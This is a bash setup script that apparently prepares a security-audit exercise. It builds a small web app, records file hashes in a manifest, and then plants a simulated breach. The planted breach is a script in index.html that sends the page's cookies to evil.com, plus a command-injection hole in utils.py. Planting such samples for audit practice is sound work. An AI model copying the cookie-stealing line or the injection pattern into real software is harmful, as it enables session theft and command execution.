#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip coreutils
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/webapp

    # Create the original content
    cat << 'EOF' > /home/user/webapp/index.html
<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body><h1>Welcome to our site!</h1></body>
</html>
EOF

    cat << 'EOF' > /home/user/webapp/utils.py
import os
def get_user_home(username):
    # Safe implementation
    return "/home/" + username
EOF

    cat << 'EOF' > /home/user/webapp/app.py
from utils import get_user_home
def main():
    print("App started.")
EOF

    # Calculate the manifest hashes based on ORIGINAL content
    INDEX_HASH=$(sha256sum /home/user/webapp/index.html | awk '{print $1}')
    UTILS_HASH=$(sha256sum /home/user/webapp/utils.py | awk '{print $1}')
    APP_HASH=$(sha256sum /home/user/webapp/app.py | awk '{print $1}')

    cat << EOF > /home/user/manifest.txt
index.html $INDEX_HASH
utils.py $UTILS_HASH
app.py $APP_HASH
EOF

    # Mutate files to simulate the breach
    # 1. Mutate index.html: Add XSS and make world-writable
    cat << 'EOF' > /home/user/webapp/index.html
<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body><h1>Welcome to our site!</h1>
<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
</body>
</html>
EOF

    # 2. Mutate utils.py: Add Command Injection
    cat << 'EOF' > /home/user/webapp/utils.py
import os
def get_user_home(username):
    # Vulnerable implementation injected by attacker
    os.system("echo User login: " + username)
    return "/home/" + username
EOF

    chmod -R 777 /home/user

    # Fix permissions for the audit task
    chmod 666 /home/user/webapp/index.html
    chmod 644 /home/user/webapp/utils.py
    chmod 644 /home/user/webapp/app.py
    chmod 644 /home/user/manifest.txt
